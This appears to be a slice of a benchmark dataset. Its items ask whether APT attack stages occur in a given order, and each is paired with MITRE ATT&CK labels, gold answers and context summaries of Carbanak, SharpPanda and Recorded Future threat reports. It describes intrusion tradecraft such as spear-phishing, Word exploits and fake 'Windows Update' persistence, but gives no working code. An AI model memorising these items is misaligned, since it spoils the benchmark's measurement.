Collection: The attackers collected and prepared a series of potentially valuable documents pertaining to internal applications and procedures for exfiltration.
Command and Control: The Cobalt Strike beacon was used for command and control, allowing the attackers to communicate with compromised systems and check for new commands to be executed.
Exfiltration: The attackers prepared documents related to internal applications and procedures for exfiltration, which were relevant to the internal applications.
Others: The Carbanak group impersonated high-profile organizations in their spear-phishing campaigns, such as IBM, European Central Bank, and cybersecurity companies. The group's leader was apprehended in Spain on March 26th, 2018, but the group remained active with subsequent campaigns reported until May 2018. The group's use of Cobalt Strike – a pentesting tool – allowed them to infiltrate organizations, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools.",Yes,An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive
2087,361,361-Credential Access-T1003-OS Credential Dumping,Is it likely that the Carbanak group used the Cobalt Strike beacon to map the organization's internal network and collect administrative-level credentials before compromising credentials for a Domain Administrator and using them to compromise additional endpoints?,Credential Access: The attackers compromised credentials for a Domain Administrator and used them to compromise at least two more endpoints by the end of the first day.,"Reconnaissance: The Carbanak group conducted reconnaissance by collecting data related to banking applications and internal procedures after business hours or on weekends to avoid detection. This information was prepared for exfiltration to be used in the final stage of the attack.
Initial Access: The initial compromise involved spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component. Victims were tricked into opening these attachments, which used exploits for Remote Code Execution in Microsoft Word (CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802).
Execution: After the initial compromise, the adversary had the ability to download and execute new payloads, run shell commands to move laterally in the infrastructure, and delete files from the system to leave fewer forensic traces.
Persistence: The attackers established persistence in the infrastructure using a backdoor from the Command and Control Server.
Privilege Escalation: The attackers aimed to find admin-level credentials to move across the entire infrastructure, compromising a Domain Administrator account and using it throughout the duration of the attack.
Defense Evasion: The Carbanak group minimized detection opportunities by performing operations outside business hours, limiting interaction to a handful of systems, and using single workstations as a hub for centralizing collected information and communication with their C&C server.
Discovery: The attackers used the Cobalt Strike beacon to discover and map the organization's internal network, collecting administrative level credentials and compromising additional network endpoints.
Lateral Movement: The attackers moved laterally across the infrastructure, compromising numerous workstations in search of critical information and targeting internal hosts and servers that would be used during the actual heist.
Collection: The attackers collected and prepared a series of potentially valuable documents pertaining to internal applications and procedures for exfiltration.
Command and Control: The Cobalt Strike beacon was used for command and control, allowing the attackers to communicate with compromised systems and check for new commands to be executed.
Exfiltration: The attackers prepared documents related to internal applications and procedures for exfiltration, which were relevant to the internal applications.
Others: The Carbanak group impersonated high-profile organizations in their spear-phishing campaigns, such as IBM, European Central Bank, and cybersecurity companies. The group's leader was apprehended in Spain on March 26th, 2018, but the group remained active with subsequent campaigns reported until May 2018. The group's use of Cobalt Strike – a pentesting tool – allowed them to infiltrate organizations, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools.",Yes,An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive
2088,361,361-Collection-T1213-Data from Information Repositories,"After the Carbanak group used the Cobalt Strike beacon for discovering and mapping the organization's internal network, is it likely that they moved laterally across the infrastructure targeting internal hosts and servers before preparing and collecting documents related to internal applications and procedures for exfiltration?",Collection: The attackers collected and prepared a series of potentially valuable documents pertaining to internal applications and procedures for exfiltration.,"Reconnaissance: The Carbanak group conducted reconnaissance by collecting data related to banking applications and internal procedures after business hours or on weekends to avoid detection. This information was prepared for exfiltration to be used in the final stage of the attack.
Initial Access: The initial compromise involved spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component. Victims were tricked into opening these attachments, which used exploits for Remote Code Execution in Microsoft Word (CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802).
Execution: After the initial compromise, the adversary had the ability to download and execute new payloads, run shell commands to move laterally in the infrastructure, and delete files from the system to leave fewer forensic traces.
Persistence: The attackers established persistence in the infrastructure using a backdoor from the Command and Control Server.
Privilege Escalation: The attackers aimed to find admin-level credentials to move across the entire infrastructure, compromising a Domain Administrator account and using it throughout the duration of the attack.
Defense Evasion: The Carbanak group minimized detection opportunities by performing operations outside business hours, limiting interaction to a handful of systems, and using single workstations as a hub for centralizing collected information and communication with their C&C server.
Credential Access: The attackers compromised credentials for a Domain Administrator and used them to compromise at least two more endpoints by the end of the first day.
Discovery: The attackers used the Cobalt Strike beacon to discover and map the organization's internal network, collecting administrative level credentials and compromising additional network endpoints.
Lateral Movement: The attackers moved laterally across the infrastructure, compromising numerous workstations in search of critical information and targeting internal hosts and servers that would be used during the actual heist.
Command and Control: The Cobalt Strike beacon was used for command and control, allowing the attackers to communicate with compromised systems and check for new commands to be executed.
Exfiltration: The attackers prepared documents related to internal applications and procedures for exfiltration, which were relevant to the internal applications.
Others: The Carbanak group impersonated high-profile organizations in their spear-phishing campaigns, such as IBM, European Central Bank, and cybersecurity companies. The group's leader was apprehended in Spain on March 26th, 2018, but the group remained active with subsequent campaigns reported until May 2018. The group's use of Cobalt Strike – a pentesting tool – allowed them to infiltrate organizations, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools.",Yes,An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive
2089,361,361-Privilege Escalation-T1078-Valid Accounts,"After the attackers used domain administrative credentials obtained during credential access to compromise additional endpoints through discovery, is it likely that they aimed to find admin-level credentials before compromising and using the Domain Administrator account to move across the entire infrastructure?","Privilege Escalation: The attackers aimed to find admin-level credentials to move across the entire infrastructure, compromising a Domain Administrator account and using it throughout the duration of the attack.","Reconnaissance: The Carbanak group conducted reconnaissance by collecting data related to banking applications and internal procedures after business hours or on weekends to avoid detection. This information was prepared for exfiltration to be used in the final stage of the attack.
Initial Access: The initial compromise involved spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component. Victims were tricked into opening these attachments, which used exploits for Remote Code Execution in Microsoft Word (CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802).
Execution: After the initial compromise, the adversary had the ability to download and execute new payloads, run shell commands to move laterally in the infrastructure, and delete files from the system to leave fewer forensic traces.
Persistence: The attackers established persistence in the infrastructure using a backdoor from the Command and Control Server.
Defense Evasion: The Carbanak group minimized detection opportunities by performing operations outside business hours, limiting interaction to a handful of systems, and using single workstations as a hub for centralizing collected information and communication with their C&C server.
Credential Access: The attackers compromised credentials for a Domain Administrator and used them to compromise at least two more endpoints by the end of the first day.
Discovery: The attackers used the Cobalt Strike beacon to discover and map the organization's internal network, collecting administrative level credentials and compromising additional network endpoints.
Lateral Movement: The attackers moved laterally across the infrastructure, compromising numerous workstations in search of critical information and targeting internal hosts and servers that would be used during the actual heist.
Collection: The attackers collected and prepared a series of potentially valuable documents pertaining to internal applications and procedures for exfiltration.
Command and Control: The Cobalt Strike beacon was used for command and control, allowing the attackers to communicate with compromised systems and check for new commands to be executed.
Exfiltration: The attackers prepared documents related to internal applications and procedures for exfiltration, which were relevant to the internal applications.
Others: The Carbanak group impersonated high-profile organizations in their spear-phishing campaigns, such as IBM, European Central Bank, and cybersecurity companies. The group's leader was apprehended in Spain on March 26th, 2018, but the group remained active with subsequent campaigns reported until May 2018. The group's use of Cobalt Strike – a pentesting tool – allowed them to infiltrate organizations, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools.",Yes,An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive
2095,363,363-Execution-T1203-Exploitation for Client Execution,"After gaining initial access through spear-phishing emails with malicious DOCX documents employing the remote template technique, is it likely that the attackers will exploit Equation Editor vulnerabilities using the RoyalRoad tool to initiate a multi-stage infection chain before creating a scheduled task named 'Windows Update' to maintain persistence?","Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2101,363,363-Impact-T1529-System Shutdown/Reboot,"After the backdoor installed by the attackers exfiltrates data over the C&C channel using encrypted communication, is it likely that it will shut down the victim's computer to disrupt operations and impact system availability?","Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2103,363,363-Discovery-T1033-System Owner/User Discovery,"After employing anti-analysis and anti-debugging techniques throughout the infection chain in the Defense Evasion phase, is it likely that the loader will gather information about the victim's computer in the Discovery phase before collecting detailed victim system data and activity through the backdoor?","Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2104,363,363-Discovery-T1016-System Network Configuration Discovery,"After establishing persistence using a scheduled task named 'Windows Update' to execute a DLL function via 'rundll32.exe', is it likely that the attackers employed anti-sandboxing techniques and dynamically resolved APIs to evade detection before the loader gathered information about the victim's computer for discovery purposes?","Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2105,363,363-Discovery-T1518-Software Discovery,"After employing anti-analysis and anti-debugging techniques to evade defenses, is it likely that the loader will query WMI for anti-virus and other software details as part of software discovery before the installed backdoor collects a wide range of data, including file manipulation and system information, to support surveillance objectives?","Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2106,363,363-Collection-T1005-Data from Local System,"After the loader gathers detailed information about the victim's computer, including hostname, OS name and version, system type, user name, MAC addresses, and anti-virus information via WMI queries, is it likely that the backdoor will collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information?","Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2107,363,363-Collection-T1113-Screen Capture,"After gathering detailed victim information including hostname, OS details, user name, and MAC addresses during the Discovery phase, is it likely that the attackers' backdoor will collect screenshots as part of its extensive data collection capabilities before communicating the collected data with the C&C server?","Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2108,363,363-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the backdoor communicated with the C&C server using an encrypted protocol to send a 'Start conversation' message and receive a 'Get Victim Information' message, is it likely that the attackers leveraged its capabilities to collect detailed system information such as file manipulation, screenshots, and network details before exfiltrating the collected data over the established C&C channel?","Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.","Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2109,364,364-Initial Access-T1133-External Remote Services,"After acquiring a server through compromise or legitimate purchase and tuning configurations, is it likely that threat actors will access the server via panel login, SSH, or RDP before exposing the malware controller on a port to administer commands to infections?","Initial Access: Before a server can be used maliciously by a threat actor, it must be acquired through compromise or legitimate purchase. The software is then installed, configurations are tuned, SSL certificates are registered, and files are added to the server. The actors access it via panel login, SSH, or RDP, and expose the malware controller on a port to allow data transfer from the victim and to administer commands to infections.","Resource Development: Recorded Future's Insikt Group conducted a study on malicious command and control (C2) infrastructure, identifying servers through proactive scanning and collection methods. The study, current as of December 10, 2021, tracks the creation and modification of new malicious infrastructure for various toolkits, custom malware, and RATs. Since 2017, Insikt Group has created detections for 80 families, including RATs, APT malware, botnet families, and other commodity tools. Over 10,000 unique C2 servers were observed in 2021 across these families. The data was sourced from the Recorded Future Platform.
